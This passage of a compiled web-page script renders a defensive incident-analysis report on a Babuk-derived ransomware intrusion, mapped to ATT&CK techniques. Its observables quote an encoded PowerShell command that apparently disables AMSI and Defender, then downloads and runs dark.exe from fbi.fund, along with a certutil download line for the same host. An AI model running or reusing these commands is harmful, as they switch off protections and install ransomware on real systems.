Transfer"),(0,A.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols")),(0,A.kt)("h4",{id:"behaviors-and-observables-2"},"Behaviors and Observables"),(0,A.kt)("table",null,(0,A.kt)("thead",{parentName:"table"},(0,A.kt)("tr",{parentName:"thead"},(0,A.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,A.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,A.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,A.kt)("tbody",{parentName:"table"},(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,A.kt)("br",null),"T1562.001",(0,A.kt)("br",null),"T1027",(0,A.kt)("br",null),"T1105"),(0,A.kt)("td",{parentName:"tr",align:null},"Malicious PowerShell command execution for malware download."),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"Process Created"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},"powershell.exe  -nop -w hidden -e JAB3ACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYwAgAD0AIAAnAHMAaQAnADsAJABtACAAPQAgACcAVQB0AGkAbABzACcAOwAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AG0AewAxAH0AewAyAH0AJwAgAC0AZgAgACQAdwAsACQAYwAsACQAbQApACkAIAA7ACAAJABmAGkAZQBsAGQAIAA9ACAAJABhAHMAcwBlAG0AYgBsAHkALgBHAGUAdABGAGkAZQBsAGQAKAAoACcAYQBtAHsAMAB9AEkAbgBpAHQARgBhAGkAbABlAGQAJwAgAC0AZgAgACQAYwApACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7ACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwBTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlACAALQBEAGkAcwBhAGIAbABlAFMAYwByAGkAcAB0AFMAYwBhAG4AbgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIAAkAHQAcgB1AGUAIAAtAEQAaQBzAGEAYgBsAGUASQBuAHQAcgB1AHMAaQBvAG4AUAByAGUAdgBlAG4AdABpAG8AbgBTAHkAcwB0AGUAbQAgACQAdAByAHUAZQA7ACAAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAgACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AEkAbgB2AG8AawBlAC0AVwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AdQByAGkAIABoAHQAdABwADoALwAvAGYAYgBpAC4AZgB1AG4AZAAvAGQAYQByAGsALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgAGQAYQByAGsALgBlAHgAZQA7AGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQB1AHIAbABjAGEAYwBoAGUAIAAtAHMAcABsAGkAdAAgAC0AZgAgAGgAdAB0AHAAOgAvAC8AZgBiAGkALgBmAHUAbgBkAC8AZABhAHIAawAuAGUAeABlACAAOwAgAC4AXABkAGEAcgBrAC4AZQB4AGUA"))),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null}),(0,A.kt)("td",{parentName:"tr",align:null},"PowerShell performs DNS Query (fbi","[.]","fund)."),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,A.kt)("inlineCode",{parentName:"td"},"fbi[.]fund"))),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,A.kt)("br",null),"T1059.001"),(0,A.kt)("td",{parentName:"tr",align:null},"PowerShell performs network connection (185.219.52","[.]","229)"),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,A.kt)("inlineCode",{parentName:"td"},"185.219.52[.]229"),(0,A.kt)("br",null),(0,A.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,A.kt)("inlineCode",{parentName:"td"},"fbi[.]fund"))))),(0,A.kt)("h4",{id:"notes-2"},"Notes"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"This IP has been seen delivering dark.exe and other binaries (",(0,A.kt)("a",{parentName:"li",href:"https://urlscan.io/search/#185.219.52.229"},"https://urlscan.io/search/#185.219.52.229"),")")),(0,A.kt)("h3",{id:"threat-actor-used-certutil-via-powershell-to-download-additional-artifacts-for-command-and-control"},"Threat Actor used ",(0,A.kt)("em",{parentName:"h3"},"CERTUTIL via PowerShell")," to download additional artifacts for Command And Control."),(0,A.kt)("h4",{id:"tactic-3"},"Tactic"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"Command And Control")),(0,A.kt)("h4",{id:"techniques-3"},"Techniques"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,A.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer"),(0,A.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols")),(0,A.kt)("h4",{id:"behaviors-and-observables-3"},"Behaviors and Observables"),(0,A.kt)("table",null,(0,A.kt)("thead",{parentName:"table"},(0,A.kt)("tr",{parentName:"thead"},(0,A.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,A.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,A.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,A.kt)("tbody",{parentName:"table"},(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,A.kt)("br",null),"T1105"),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"PowerShell")," launched ",(0,A.kt)("em",{parentName:"td"},"CERTUTIL")," to download additional malware."),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"Process Created"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\certutil.exe\\" -urlcache -split -f http://fbi[.]fund/dark.exe'))),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null}),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"CERTUTIL")," performed DNS Query (fbi","[.]","fund)"),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,A.kt)("inlineCode",{parentName:"td"},"fbi[.]fund"))),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,A.kt)("br",null),"T1059.001"),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"CERTUTIL")," performed network connection (185.219.52","[.]","229)"),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,A.kt)("inlineCode",{parentName:"td"},"185.219.52[.]229"),(0,A.kt)("br",null),(0,A.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,A.kt)("inlineCode",{parentName:"td"},"fbi[.]fund"))),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null}),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"CERTUTIL")," attempted to download additional malware (Trojan named GenericRXPZ-PI!CD66BE302D78 was detected and deleted)"),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"File Modified"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\ServiceProfiles\\\\NetworkService\\\\AppData\\\\LocalLow\\\\Microsoft\\\\CryptnetUrlCache\\\\Content\\\\B95F7C314E77C19D7A1EC2DDAB877740"))))),(0,A.kt)("h4",{id:"notes-3"},"Notes"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"NT AUTHORITY\\NETWORK SERVICE ran C:","\\","Windows","\\","SysWOW64","\\","certutil.exe, which attempted to access C:","\\","Windows","\\","ServiceProfiles","\\","NetworkService","\\","AppData","\\","LocalLow","\\","Microsoft","\\","CryptnetUrlCache","\\","Content","\\","B95F7C314E77C19D7A1EC2DDAB877740. The Trojan named GenericRXPZ-PI!CD66BE302D78 was detected and deleted."),(0,A.kt)("li",{parentName:"ul"},"Event corresponds most likely to the donwload attempt for ",(0,A.kt)("em",{parentName:"li"},"dark.exe"),".")),(0,A.kt)("h3",{id:"threat-actor-used-powershell-to-run-the-ransomware-binary-file-for-impact"},"Threat Actor used ",(0,A.kt)("em",{parentName:"h3"},"PowerShell")," to run the ransomware binary file for Impact."),(0,A.kt)("h4",{id:"tactic-4"},"Tactic"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"Impact")),(0,A.kt)("h4",{id:"techniques-4"},"Techniques"),(0,A.kt)("h4",{id:"behaviors-and-observables-4"},"Behaviors and Observables"),(0,A.kt)("table",null,(0,A.kt)("thead",{parentName:"table"},(0,A.kt)("tr",{parentName:"thead"},(0,A.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,A.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,A.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,A.kt)("tbody",{parentName:"table"},(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null}),(0,A.kt)("td",{parentName:"tr",align:null},"PowerShell launches ransomware binary"),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"Process Created"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},"dark.exe"),(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},"tortilla.exe"))))),(0,A.kt)("h4",{id:"notes-4"},"Notes"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"This behavior was not found on EDR Telemetry by the time of this investigation (as ENS blocked the attack). But there are reports from 2 researchers about similar cases."),(0,A.kt)("li",{parentName:"ul"},"File hash has 37/67 detection @ VT (sample submitted by the time of this investigation)"),(0,A.kt)("li",{parentName:"ul"},"Sophos team reports this as ransomware (",(0,A.kt)("a",{parentName:"li",href:"https://mobile.twitter.com/th3_protoCOL/status/1448701084785000448"},"https://mobile.twitter.com/th3_protoCOL/status/1448701084785000448"),")"),(0,A.kt)("li",{parentName:"ul"},"TG Soft (@VirITeXplorer) reports dark.exe / tortillas.exe to deploy a modified version of Babuk ransomware (",(0,A.kt)("a",{parentName:"li",href:"https://mobile.twitter.com/VirITeXplorer/status/1448689555083780101"},"https://mobile.twitter.com/VirITeXplorer/status/1448689555083780101"),")"),(0,A.kt)("li",{parentName:"ul"},"TG Soft (@VirITeXplorer) reports ransom note named 'How To Restore Your Files.txt', and file extension for encrypted files as .babyk.")))}m.isMDXComponent=!0}}]);